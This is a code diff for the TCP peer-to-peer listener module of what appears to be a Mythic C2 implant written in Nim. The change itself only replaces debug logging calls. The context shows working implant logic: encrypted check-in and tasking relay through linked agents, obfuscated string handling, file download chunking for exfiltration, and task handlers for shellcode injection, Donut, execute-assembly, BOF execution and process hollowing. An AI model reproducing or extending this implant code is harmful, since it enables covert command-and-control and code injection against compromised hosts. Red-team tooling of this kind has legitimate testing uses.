@@ -58,7 +58,7 @@ proc newTcpProfile*(): TcpProfile =
   result.listening = false
   result.callbackUuid = result.config.uuid  # Initialize with payload UUID
   
-  debug "[DEBUG] TCP P2P Profile: Created (will listen on port ", result.config.callbackPort, ")"
+  debugLog "tcp", "TCP P2P Profile: Created (will listen on port ", result.config.callbackPort, ")"
 
 
 proc sendChunkedMessage(socket: AsyncSocket, message: string): Future[void] {.async.} =
@@ -72,7 +72,7 @@ proc sendChunkedMessage(socket: AsyncSocket, message: string): Future[void] {.as
   lenBytes[2] = byte((messageLen shr 8) and 0xFF)
   lenBytes[3] = byte(messageLen and 0xFF)
   
-  debug "[DEBUG] TCP P2P: Sending message length: ", messageLen, " bytes"
+  debugLog "tcp", "TCP P2P: Sending message length: ", messageLen, " bytes"
   
   # Send length prefix
   await socket.send(addr lenBytes[0], 4)
@@ -80,7 +80,7 @@ proc sendChunkedMessage(socket: AsyncSocket, message: string): Future[void] {.as
   # Send message data
   await socket.send(message)
   
-  debug "[DEBUG] TCP P2P: Message sent successfully"
+  debugLog "tcp", "TCP P2P: Message sent successfully"
 
 proc receiveChunkedMessage(socket: AsyncSocket): Future[string] {.async.} =
   ## Receive a length-prefixed chunked message
@@ -89,7 +89,7 @@ proc receiveChunkedMessage(socket: AsyncSocket): Future[string] {.async.} =
   # Read 4-byte length prefix
   let readLen = await socket.recvInto(addr lenBytes[0], 4)
   if readLen != 4:
-    debug "[DEBUG] TCP P2P: Failed to read length prefix, got ", readLen, " bytes"
+    debugLog "tcp", "TCP P2P: Failed to read length prefix, got ", readLen, " bytes"
     return ""
   
   # Convert from big-endian
@@ -98,32 +98,32 @@ proc receiveChunkedMessage(socket: AsyncSocket): Future[string] {.async.} =
                    (lenBytes[2].uint32 shl 8) or 
                    lenBytes[3].uint32
   
-  debug "[DEBUG] TCP P2P: Expecting message of ", messageLen, " bytes"
+  debugLog "tcp", "TCP P2P: Expecting message of ", messageLen, " bytes"
   
   if messageLen == 0 or messageLen > 100_000_000:  # 100MB sanity check
-    debug "[DEBUG] TCP P2P: Invalid message length: ", messageLen
+    debugLog "tcp", "TCP P2P: Invalid message length: ", messageLen
     return ""
   
   # Read message data
   result = await socket.recv(messageLen.int)
-  debug "[DEBUG] TCP P2P: Received ", result.len, " bytes"
+  debugLog "tcp", "TCP P2P: Received ", result.len, " bytes"
 
 proc encryptMessage(profile: TcpProfile, message: string, uuid: string): string =
   ## Encrypt a message with AES or just base64 encode if no key
   if profile.aesKey.len > 0 and uuid.len > 0:
-    debug "[DEBUG] TCP P2P: Encrypting message with AES-256-CBC+HMAC"
+    debugLog "tcp", "TCP P2P: Encrypting message with AES-256-CBC+HMAC"
     result = encryptPayload(message, profile.aesKey, uuid)
   else:
-    debug "[DEBUG] TCP P2P: Encoding message (no encryption)"
+    debugLog "tcp", "TCP P2P: Encoding message (no encryption)"
     result = encode(uuid & message)
 
 proc decryptMessage(profile: TcpProfile, message: string): string =
   ## Decrypt a message with AES or just base64 decode if no key
   if profile.aesKey.len > 0:
-    debug "[DEBUG] TCP P2P: Decrypting message with AES-256-CBC+HMAC"
+    debugLog "tcp", "TCP P2P: Decrypting message with AES-256-CBC+HMAC"
     result = decryptPayload(message, profile.aesKey)
   else:
-    debug "[DEBUG] TCP P2P: Decoding message (no encryption)"
+    debugLog "tcp", "TCP P2P: Decoding message (no encryption)"
     let decoded = decode(message)
     if decoded.len > 36:
       result = decoded[36..^1]
@@ -242,7 +242,7 @@ proc forwardIncomingDelegates*(msgJson: JsonNode) =
       if delegate.hasKey(obf("uuid")) and delegate.hasKey(obf("message")):
         let delegateUuid = delegate[obf("uuid")].getStr()
         let delegateMsg = delegate[obf("message")].getStr()
-        debug "[DEBUG] TCP P2P: Forwarding delegate to downstream agent ", delegateUuid
+        debugLog "tcp", "TCP P2P: Forwarding delegate to downstream agent ", delegateUuid
         discard forwardDelegateToConnect(delegateUuid, delegateMsg)
         when defined(windows):
           discard forwardDelegateToLink(delegateUuid, delegateMsg)
@@ -253,7 +253,7 @@ proc forwardIncomingDelegates*(msgJson: JsonNode) =
           else:
             delegate[obf("mythic_uuid")].getStr()
           if newUuid != delegateUuid:
-            debug "[DEBUG] TCP P2P: Rekeying downstream from ", delegateUuid, " to ", newUuid
+            debugLog "tcp", "TCP P2P: Rekeying downstream from ", delegateUuid, " to ", newUuid
             discard rekeyConnectConnection(delegateUuid, newUuid)
             when defined(windows):
               discard rekeyLinkConnection(delegateUuid, newUuid)
@@ -295,7 +295,7 @@ proc collectDownstreamDelegates*(callbackUuid: string): tuple[delegates: JsonNod
 proc startListening*(profile: TcpProfile): Future[void] {.async.} =
   ## Start listening for P2P connections
   if profile.listening:
-    debug "[DEBUG] TCP P2P: Already listening"
+    debugLog "tcp", "TCP P2P: Already listening"
     return
   
   try:
@@ -303,39 +303,39 @@ proc startListening*(profile: TcpProfile): Future[void] {.async.} =
     profile.server.bindAddr(profile.port, "0.0.0.0")
     profile.server.listen()
     profile.listening = true
-    debug "[DEBUG] TCP P2P: Listening on 0.0.0.0:", profile.port.int
+    debugLog "tcp", "TCP P2P: Listening on 0.0.0.0:", profile.port.int
   except Exception as e:
-    debug "[DEBUG] TCP P2P: Failed to start listening: ", e.msg
+    debugLog "tcp", "TCP P2P: Failed to start listening: ", e.msg
     profile.listening = false
 
 proc send*(profile: TcpProfile, data: string, callbackUuid: string = ""): string =
   ## For TCP P2P, send is not used directly - communication happens through handleClient
   ## This is here for interface compatibility with other profiles
-  debug "[DEBUG] TCP P2P: send() called but TCP is a listener profile (P2P)"
+  debugLog "tcp", "TCP P2P: send() called but TCP is a listener profile (P2P)"
   result = ""
 
 proc start*(profile: TcpProfile) {.async.} =
   ## Start the TCP P2P listener and handle clients
   ## This is the main entry point for TCP profile agents
-  debug "[DEBUG] TCP P2P: Starting TCP listener agent"
+  debugLog "tcp", "TCP P2P: Starting TCP listener agent"
   
   # Start listening
   await profile.startListening()
   
   if not profile.listening:
-    debug "[DEBUG] TCP P2P: Failed to start listening, exiting"
+    debugLog "tcp", "TCP P2P: Failed to start listening, exiting"
     return
   
-  debug "[DEBUG] TCP P2P: Server started, waiting for connections"
+  debugLog "tcp", "TCP P2P: Server started, waiting for connections"
   
   # Main accept loop - runs until process exits
   while true:
     try:
       # Accept new client
       let client = await profile.server.accept()
-      debug "[DEBUG] TCP P2P: New client connected"
+      debugLog "tcp", "TCP P2P: New client connected"
       
-      debug "[DEBUG] TCP P2P: Sending checkin to link agent"
+      debugLog "tcp", "TCP P2P: Sending checkin to link agent"
       
       # Build checkin with actual system info using reusable function
       let checkinMsg = buildCheckinInfo()
@@ -343,31 +343,31 @@ proc start*(profile: TcpProfile) {.async.} =
       let checkinData = profile.encryptMessage($checkinMsg, profile.callbackUuid)
       await sendChunkedMessage(client, checkinData)
       
-      debug "[DEBUG] TCP P2P: Waiting for checkin response from Mythic (via link agent)"
+      debugLog "tcp", "TCP P2P: Waiting for checkin response from Mythic (via link agent)"
       
       # Wait for checkin response (will come from Mythic via the linking agent)
       let checkinResp = await receiveChunkedMessage(client)
       if checkinResp.len == 0:
-        debug "[DEBUG] TCP P2P: No checkin response, closing client"
+        debugLog "tcp", "TCP P2P: No checkin response, closing client"
         client.close()
         continue
       
       let checkinRespData = profile.decryptMessage(checkinResp)
-      debug "[DEBUG] TCP P2P: Received checkin response from Mythic"
+      debugLog "tcp", "TCP P2P: Received checkin response from Mythic"
       
       # Parse checkin response to get our callback UUID
       try:
         let checkinJson = parseJson(checkinRespData)
         if checkinJson.hasKey(obf("id")):
           profile.callbackUuid = checkinJson[obf("id")].getStr()
-          debug "[DEBUG] TCP P2P: Callback UUID updated to: ", profile.callbackUuid
+          debugLog "tcp", "TCP P2P: Callback UUID updated to: ", profile.callbackUuid
       except Exception as e:
-        debug "[DEBUG] TCP P2P: Failed to parse checkin response: ", e.msg
+        debugLog "tcp", "TCP P2P: Failed to parse checkin response: ", e.msg
       
       # Enter client message loop
       # In a full implementation, spawn this as a separate task
       # For now, handle synchronously
-      debug "[DEBUG] TCP P2P: Entering client message loop"
+      debugLog "tcp", "TCP P2P: Entering client message loop"
       
       # Track background tasks for this connection (persists across message cycles)
       var backgroundTasks = initTable[string, BackgroundTaskState]()
@@ -378,7 +378,7 @@ proc start*(profile: TcpProfile) {.async.} =
           # Start receiving from parent (non-blocking future)
           # While waiting, periodically check downstream P2P connections
           # and relay data proactively (critical for multi-hop: HTTP <- TCP <- TCP)
-          debug "[DEBUG] TCP P2P: Waiting for message from linking agent..."
+          debugLog "tcp", "TCP P2P: Waiting for message from linking agent..."
           let recvFut = receiveChunkedMessage(client)
           
           while not recvFut.finished:
@@ -391,10 +391,10 @@ proc start*(profile: TcpProfile) {.async.} =
               }
               if downDelegates.len > 0:
                 delegateResponse[obf("delegates")] = downDelegates
-                debug "[DEBUG] TCP P2P: Proactively relaying ", downDelegates.len, " downstream delegate(s)"
+                debugLog "tcp", "TCP P2P: Proactively relaying ", downDelegates.len, " downstream delegate(s)"
               if downEdges.len > 0:
                 delegateResponse[obf("edges")] = downEdges
-                debug "[DEBUG] TCP P2P: Proactively relaying ", downEdges.len, " downstream edge(s)"
+                debugLog "tcp", "TCP P2P: Proactively relaying ", downEdges.len, " downstream edge(s)"
               let encrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
               await sendChunkedMessage(client, encrypted)
             
@@ -402,37 +402,37 @@ proc start*(profile: TcpProfile) {.async.} =
           
           let clientMsg = recvFut.read()
           if clientMsg.len == 0:
-            debug "[DEBUG] TCP P2P: Client disconnected"
+            debugLog "tcp", "TCP P2P: Client disconnected"
             break
           
-          debug "[DEBUG] TCP P2P: Received ", clientMsg.len, " bytes from linking agent"
+          debugLog "tcp", "TCP P2P: Received ", clientMsg.len, " bytes from linking agent"
           let decrypted = profile.decryptMessage(clientMsg)
-          debug "[DEBUG] TCP P2P: Decrypted message (", decrypted.len, " bytes): ", decrypted[0..min(100, decrypted.len-1)]
+          debugLog "tcp", "TCP P2P: Decrypted message (", decrypted.len, " bytes): ", decrypted[0..min(100, decrypted.len-1)]
           
           # Check for special actions
           try:
             let msgJson = parseJson(decrypted)
-            debug "[DEBUG] TCP P2P: Parsed JSON, checking for action or responses..."
+            debugLog "tcp", "TCP P2P: Parsed JSON, checking for action or responses..."
             
             # Forward any incoming delegates to downstream P2P agents (multi-level P2P support)
             forwardIncomingDelegates(msgJson)
             
             # Check for responses array (post_response from Mythic)
             if msgJson.hasKey(obf("responses")):
-              debug "[DEBUG] TCP P2P: Received post_response with responses array from Mythic"
+              debugLog "tcp", "TCP P2P: Received post_response with responses array from Mythic"
               
               let responses = msgJson[obf("responses")]
               var chunksToSend = newJArray()
               
               for resp in responses:
                 if not resp.hasKey(obf("task_id")):
-                  debug "[DEBUG] TCP P2P: Skipping response without task_id"
+                  debugLog "tcp", "TCP P2P: Skipping response without task_id"
                   continue
                 let taskId = resp[obf("task_id")].getStr()
                 
                 # Handle chunk_data (Mythic sending file chunks to P2P agent for upload-type tasks)
                 if resp.hasKey(obf("chunk_data")):
-                  debug "[DEBUG] TCP P2P: Received chunk_data from Mythic for task ", taskId
+                  debugLog "tcp", "TCP P2P: Received chunk_data from Mythic for task ", taskId
                   
                   if backgroundTasks.hasKey(taskId):
                     var state = backgroundTasks[taskId]
@@ -450,7 +450,7 @@ proc start*(profile: TcpProfile) {.async.} =
                       
                       if uploadResp.hasKey(obf("completed")) and uploadResp[obf("completed")].getBool():
                         backgroundTasks.del(taskId)
-                        debug "[DEBUG] TCP P2P: Upload complete"
+                        debugLog "tcp", "TCP P2P: Upload complete"
                       else:
                         state.currentChunk += 1
                         backgroundTasks[taskId] = state
@@ -465,7 +465,7 @@ proc start*(profile: TcpProfile) {.async.} =
                         
                         if execResp.hasKey(obf("completed")) and execResp[obf("completed")].getBool():
                           backgroundTasks.del(taskId)
-                          debug "[DEBUG] TCP P2P: Execute-assembly complete"
+                          debugLog "tcp", "TCP P2P: Execute-assembly complete"
                         else:
                           state.currentChunk += 1
                           backgroundTasks[taskId] = state
@@ -480,7 +480,7 @@ proc start*(profile: TcpProfile) {.async.} =
                         
                         if bofResp.hasKey(obf("completed")) and bofResp[obf("completed")].getBool():
                           backgroundTasks.del(taskId)
-                          debug "[DEBUG] TCP P2P: Inline_execute complete"
+                          debugLog "tcp", "TCP P2P: Inline_execute complete"
                         else:
                           state.currentChunk += 1
                           backgroundTasks[taskId] = state
@@ -495,7 +495,7 @@ proc start*(profile: TcpProfile) {.async.} =
                         
                         if injectResp.hasKey(obf("completed")) and injectResp[obf("completed")].getBool():
                           backgroundTasks.del(taskId)
-                          debug "[DEBUG] TCP P2P: Shinject complete"
+                          debugLog "tcp", "TCP P2P: Shinject complete"
                         else:
                           state.currentChunk += 1
                           backgroundTasks[taskId] = state
@@ -510,7 +510,7 @@ proc start*(profile: TcpProfile) {.async.} =
                         
                         if donutResp.hasKey(obf("completed")) and donutResp[obf("completed")].getBool():
                           backgroundTasks.del(taskId)
-                          debug "[DEBUG] TCP P2P: Donut complete"
+                          debugLog "tcp", "TCP P2P: Donut complete"
                         else:
                           state.currentChunk += 1
                           backgroundTasks[taskId] = state
@@ -525,14 +525,14 @@ proc start*(profile: TcpProfile) {.async.} =
                         
                         if hollowResp.hasKey(obf("completed")) and hollowResp[obf("completed")].getBool():
                           backgroundTasks.del(taskId)
-                          debug "[DEBUG] TCP P2P: Inject hollow complete"
+                          debugLog "tcp", "TCP P2P: Inject hollow complete"
                         else:
                           state.currentChunk += 1
                           backgroundTasks[taskId] = state
                     
                     of btDownload:
                       # This shouldn't happen - download sends chunks, doesn't receive them
-                      debug "[DEBUG] TCP P2P: ERROR - received chunk_data for download task!"
+                      debugLog "tcp", "TCP P2P: ERROR - received chunk_data for download task!"
                   
                   continue
                 
@@ -543,7 +543,7 @@ proc start*(profile: TcpProfile) {.async.} =
                   # Check if this is a chunk acknowledgment (has chunk_num)
                   if resp.hasKey(obf("chunk_num")):
                     let chunkNum = resp[obf("chunk_num")].getInt()
-                    debug "[DEBUG] TCP P2P: Mythic acknowledged chunk ", chunkNum, " for task ", taskId
+                    debugLog "tcp", "TCP P2P: Mythic acknowledged chunk ", chunkNum, " for task ", taskId
                     
                     # Send next chunk if download is still in progress
                     if backgroundTasks.hasKey(taskId):
@@ -551,7 +551,7 @@ proc start*(profile: TcpProfile) {.async.} =
                       if state.taskType == btDownload:
                         # Check if there are more chunks to send
                         if state.currentChunk < state.totalChunks:
-                          debug "[DEBUG] TCP P2P: Sending chunk ", state.currentChunk + 1, "/", state.totalChunks
+                          debugLog "tcp", "TCP P2P: Sending chunk ", state.currentChunk + 1, "/", state.totalChunks
                           let chunkResp = sendDownloadChunk(taskId, fileId, state.path, state.fileData, state.currentChunk, state.totalChunks)
                           
                           # Check if this was a completion message
@@ -571,13 +571,13 @@ proc start*(profile: TcpProfile) {.async.} =
                             backgroundTasks[taskId] = state
                         else:
                           # All chunks already sent, send completion using completeDownload
-                          debug "[DEBUG] TCP P2P: All chunks sent, sending final completion message"
+                          debugLog "tcp", "TCP P2P: All chunks sent, sending final completion message"
                           let completeMsg = completeDownload(taskId, fileId, state.path)
                           chunksToSend.add(completeMsg)
                           backgroundTasks.del(taskId)
                   else:
                     # Initial file_id assignment (no chunk_num)
-                    debug "[DEBUG] TCP P2P: Mythic assigned file_id ", fileId, " to task ", taskId
+                    debugLog "tcp", "TCP P2P: Mythic assigned file_id ", fileId, " to task ", taskId
                     
                     # Check if this is a download task waiting for file_id
                     if backgroundTasks.hasKey(taskId):
@@ -587,7 +587,7 @@ proc start*(profile: TcpProfile) {.async.} =
                         state.fileId = fileId
                         backgroundTasks[taskId] = state
                         
-                        debug "[DEBUG] TCP P2P: Starting chunk uploads for download task"
+                        debugLog "tcp", "TCP P2P: Starting chunk uploads for download task"
                         let chunkResp = sendDownloadChunk(taskId, fileId, state.path, state.fileData, state.currentChunk, state.totalChunks)
                         
                         # Check if this was a completion message
@@ -617,12 +617,12 @@ proc start*(profile: TcpProfile) {.async.} =
                 }
                 if downDelegates.len > 0:
                   chunkResponse[obf("delegates")] = downDelegates
-                  debug "[DEBUG] TCP P2P: Including ", downDelegates.len, " downstream delegate(s) with chunk response"
+                  debugLog "tcp", "TCP P2P: Including ", downDelegates.len, " downstream delegate(s) with chunk response"
                 if downEdges.len > 0:
                   chunkResponse[obf("edges")] = downEdges
-                  debug "[DEBUG] TCP P2P: Including ", downEdges.len, " downstream edge(s) with chunk response"
+                  debugLog "tcp", "TCP P2P: Including ", downEdges.len, " downstream edge(s) with chunk response"
                 
-                debug "[DEBUG] TCP P2P: Sending ", chunksToSend.len, " download chunk(s)"
+                debugLog "tcp", "TCP P2P: Sending ", chunksToSend.len, " download chunk(s)"
                 let responseEncrypted = profile.encryptMessage($chunkResponse, profile.callbackUuid)
                 await sendChunkedMessage(client, responseEncrypted)
                 continue
@@ -636,10 +636,10 @@ proc start*(profile: TcpProfile) {.async.} =
                 }
                 if noChunkDelegates.len > 0:
                   delegateResponse[obf("delegates")] = noChunkDelegates
-                  debug "[DEBUG] TCP P2P: Sending ", noChunkDelegates.len, " downstream delegate(s) (no chunks)"
+                  debugLog "tcp", "TCP P2P: Sending ", noChunkDelegates.len, " downstream delegate(s) (no chunks)"
                 if noChunkEdges.len > 0:
                   delegateResponse[obf("edges")] = noChunkEdges
-                  debug "[DEBUG] TCP P2P: Sending ", noChunkEdges.len, " downstream edge(s) (no chunks)"
+                  debugLog "tcp", "TCP P2P: Sending ", noChunkEdges.len, " downstream edge(s) (no chunks)"
                 let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
                 await sendChunkedMessage(client, responseEncrypted)
               else:
@@ -651,27 +651,27 @@ proc start*(profile: TcpProfile) {.async.} =
             # Check for action field
             elif msgJson.hasKey(obf("action")):
               let action = msgJson[obf("action")].getStr()
-              debug "[DEBUG] TCP P2P: Received action: ", action
+              debugLog "tcp", "TCP P2P: Received action: ", action
               
               if action == obf("checkin"):
                 # Checkin response from Mythic
-                debug "[DEBUG] TCP P2P: Processing checkin response"
+                debugLog "tcp", "TCP P2P: Processing checkin response"
                 if msgJson.hasKey(obf("status")) and msgJson[obf("status")].getStr() == "success":
                   if msgJson.hasKey(obf("id")):
                     profile.callbackUuid = msgJson[obf("id")].getStr()
-                    debug "[DEBUG] TCP P2P: Updated callback UUID to: ", profile.callbackUuid
+                    debugLog "tcp", "TCP P2P: Updated callback UUID to: ", profile.callbackUuid
                 
                 # Don't send response - just update UUID and continue
                 continue
                 
               elif action == obf("get_tasking"):
                 # This is a get_tasking response from Mythic containing tasks to execute
-                debug "[DEBUG] TCP P2P: Received get_tasking response with tasks"
+                debugLog "tcp", "TCP P2P: Received get_tasking response with tasks"
                 
                 # Extract and process tasks
                 if msgJson.hasKey(obf("tasks")) and msgJson[obf("tasks")].len > 0:
                   let tasks = msgJson[obf("tasks")]
-                  debug "[DEBUG] TCP P2P: Received ", tasks.len, " task(s) to execute"
+                  debugLog "tcp", "TCP P2P: Received ", tasks.len, " task(s) to execute"
                   
                   # Process each task and collect responses
                   var taskResponses = newJArray()
@@ -682,7 +682,7 @@ proc start*(profile: TcpProfile) {.async.} =
                       
                       # Check if this is a background_task message (file upload/download chunks)
                       if command == obf("background_task"):
-                        debug "[DEBUG] TCP P2P: Processing background_task for ", taskId
+                        debugLog "tcp", "TCP P2P: Processing background_task for ", taskId
                         
                         # Parse parameters
                         var params = newJObject()
@@ -692,7 +692,7 @@ proc start*(profile: TcpProfile) {.async.} =
                             try:
                               params = parseJson(paramStr)
                             except:
-                              debug "[DEBUG] Failed to parse background_task parameters"
+                              debugLog "tcp", "Failed to parse background_task parameters"
                         
                         # Handle background task based on type
                         if backgroundTasks.hasKey(taskId):
@@ -707,7 +707,7 @@ proc start*(profile: TcpProfile) {.async.} =
                             # Check if this was the last chunk (completeDownload returns completed=true)
                             if chunkResponse.hasKey(obf("completed")) and chunkResponse[obf("completed")].getBool():
                               backgroundTasks.del(taskId)
-                              debug "[DEBUG] TCP P2P: Download complete"
+                              debugLog "tcp", "TCP P2P: Download complete"
                             else:
                               state.currentChunk += 1
                               backgroundTasks[taskId] = state
@@ -715,9 +715,9 @@ proc start*(profile: TcpProfile) {.async.} =
                           of btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow:
                             # Upload and other file-receiving tasks are handled via chunk_data in responses
                             # background_task messages don't apply to these
-                            debug "[DEBUG] TCP P2P: background_task not applicable for upload-type tasks"
+                            debugLog "tcp", "TCP P2P: background_task not applicable for upload-type tasks"
                         else:
-                          debug "[DEBUG] TCP P2P: No background task state for ", taskId
+                          debugLog "tcp", "TCP P2P: No background task state for ", taskId
                         
                         continue
                       
@@ -729,14 +729,14 @@ proc start*(profile: TcpProfile) {.async.} =
                           try:
                             params = parseJson(paramStr)
                           except:
-                            debug "[DEBUG] Failed to parse parameters: " & paramStr
+                            debugLog "tcp", "Failed to parse parameters: " & paramStr
                       
                       # Execute task using task_processor
                       let execResult = executeTask(taskId, command, params)
                       
                       # Check if we should exit
                       if execResult.shouldExit:
-                        debug "[DEBUG] TCP P2P: Exit command received"
+                        debugLog "tcp", "TCP P2P: Exit command received"
                         taskResponses.add(execResult.response)
                         shouldExit = true
                         # Don't process any more tasks
@@ -744,7 +744,7 @@ proc start*(profile: TcpProfile) {.async.} =
                       
                       # Handle download command specially (needs in-memory file loading)
                       if command == obf("download") and execResult.needsBackgroundTracking:
-                        debug "[DEBUG] TCP P2P: Starting download"
+                        debugLog "tcp", "TCP P2P: Starting download"
                         taskResponses.add(execResult.response)
                         
                         # Track as background task for chunk handling
@@ -768,15 +768,15 @@ proc start*(profile: TcpProfile) {.async.} =
                             discard f.readBytes(state.fileData, 0, fileSize)
                             f.close()
                             backgroundTasks[taskId] = state
-                            debug "[DEBUG] TCP P2P: File loaded, ", fileSize, " bytes"
+                            debugLog "tcp", "TCP P2P: File loaded, ", fileSize, " bytes"
                         except Exception as e:
-                          debug "[DEBUG] TCP P2P: Failed to read file: ", e.msg
+                          debugLog "tcp", "TCP P2P: Failed to read file: ", e.msg
                         
                         continue
                       
                       # Handle upload command
                       elif command == obf("upload") and execResult.needsBackgroundTracking:
-                        debug "[DEBUG] TCP P2P: Starting upload"
+                        debugLog "tcp", "TCP P2P: Starting upload"
                         taskResponses.add(execResult.response)
                         
                         # Track as background task for chunk handling
@@ -806,7 +806,7 @@ proc start*(profile: TcpProfile) {.async.} =
                         command == obf("inject_hollow")):
                         
                         when defined(windows):
-                          debug "[DEBUG] TCP P2P: Starting file-receiving task: ", command
+                          debugLog "tcp", "TCP P2P: Starting file-receiving task: ", command
                           taskResponses.add(execResult.response)
                           
                           # Determine task type
@@ -847,23 +847,23 @@ proc start*(profile: TcpProfile) {.async.} =
                   }
                   if taskDelegates.len > 0:
                     taskingResponse[obf("delegates")] = taskDelegates
-                    debug "[DEBUG] TCP P2P: Including ", taskDelegates.len, " downstream delegate(s) with task response"
+                    debugLog "tcp", "TCP P2P: Including ", taskDelegates.len, " downstream delegate(s) with task response"
                   if taskEdges.len > 0:
                     taskingResponse[obf("edges")] = taskEdges
-                    debug "[DEBUG] TCP P2P: Including ", taskEdges.len, " downstream edge(s) with task response"
+                    debugLog "tcp", "TCP P2P: Including ", taskEdges.len, " downstream edge(s) with task response"
                   
-                  debug "[DEBUG] TCP P2P: Sending ", taskResponses.len, " task response(s)"
+                  debugLog "tcp", "TCP P2P: Sending ", taskResponses.len, " task response(s)"
                   let responseEncrypted = profile.encryptMessage($taskingResponse, profile.callbackUuid)
                   await sendChunkedMessage(client, responseEncrypted)
                   
                   # If exit was requested, wait and break (parent will detect EOF and send edge removal)
                   if shouldExit:
-                    debug "[DEBUG] TCP P2P: Exit command sent, waiting 500ms for delivery before shutdown"
+                    debugLog "tcp", "TCP P2P: Exit command sent, waiting 500ms for delivery before shutdown"
                     await sleepAsync(500)  # Give time for message to be received and processed
                     clientShouldExit = true
                     break
                 else:
-                  debug "[DEBUG] TCP P2P: No tasks in get_tasking response"
+                  debugLog "tcp", "TCP P2P: No tasks in get_tasking response"
                   # Even without tasks, check for downstream delegate data to relay
                   let (noTaskDelegates, noTaskEdges) = collectDownstreamDelegates(profile.callbackUuid)
                   if noTaskDelegates.len > 0 or noTaskEdges.len > 0:
@@ -873,10 +873,10 @@ proc start*(profile: TcpProfile) {.async.} =
                     }
                     if noTaskDelegates.len > 0:
                       delegateResponse[obf("delegates")] = noTaskDelegates
-                      debug "[DEBUG] TCP P2P: Sending ", noTaskDelegates.len, " downstream delegate(s) (no tasks)"
+                      debugLog "tcp", "TCP P2P: Sending ", noTaskDelegates.len, " downstream delegate(s) (no tasks)"
                     if noTaskEdges.len > 0:
                       delegateResponse[obf("edges")] = noTaskEdges
-                      debug "[DEBUG] TCP P2P: Sending ", noTaskEdges.len, " downstream edge(s) (no tasks)"
+                      debugLog "tcp", "TCP P2P: Sending ", noTaskEdges.len, " downstream edge(s) (no tasks)"
                     let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
                     await sendChunkedMessage(client, responseEncrypted)
                   else:
@@ -885,28 +885,28 @@ proc start*(profile: TcpProfile) {.async.} =
                     discard
                   continue
           except Exception as e:
-            debug "[DEBUG] TCP P2P: Error processing message: ", e.msg
+            debugLog "tcp", "TCP P2P: Error processing message: ", e.msg
           
         except Exception as e:
-          debug "[DEBUG] TCP P2P: Error in client loop: ", e.msg
+          debugLog "tcp", "TCP P2P: Error in client loop: ", e.msg
           break
       
       client.close()
-      debug "[DEBUG] TCP P2P: Client handler finished"
+      debugLog "tcp", "TCP P2P: Client handler finished"
       
       # If exit command was received, break from accept loop to shut down server
       if clientShouldExit:
-        debug "[DEBUG] TCP P2P: Exit command received, shutting down server"
+        debugLog "tcp", "TCP P2P: Exit command received, shutting down server"
         break
       
     except Exception as e:
-      debug "[DEBUG] TCP P2P: Error accepting client: ", e.msg
+      debugLog "tcp", "TCP P2P: Error accepting client: ", e.msg
       # Continue listening
   
   # Clean shutdown
   profile.server.close()
   profile.listening = false
-  debug "[DEBUG] TCP P2P: Server shut down"
+  debugLog "tcp", "TCP P2P: Server shut down"
 
 
 proc setAesKey*(profile: var TcpProfile, key: seq[byte]) =
@@ -928,13 +928,13 @@ proc performKeyExchange*(profile: var TcpProfile): tuple[success: bool, newUuid:
   
   # If no encrypted exchange needed, just use the static PSK
   if not profile.config.encryptedExchange:
-    debug "[DEBUG] TCP P2P: No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
+    debugLog "tcp", "TCP P2P: No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
     # Don't set key yet - will be set after successful checkin
     return (true, "")
   
   # Only compile RSA code if encrypted exchange is enabled at build time
   when not encryptedExchange:
-    debug "[DEBUG] TCP P2P: RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
+    debugLog "tcp", "TCP P2P: RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
     return (true, "")
   
   # Use shared key exchange implementation
@@ -954,6 +954,6 @@ proc performKeyExchange*(profile: var TcpProfile): tuple[success: bool, newUuid:
       # No key exchange needed (AESPSK mode)
       return (true, "")
     else:
-      debug "[DEBUG] TCP P2P: Key exchange failed: ", exchangeResult.error
+      debugLog "tcp", "TCP P2P: Key exchange failed: ", exchangeResult.error
       return (false, "")
 
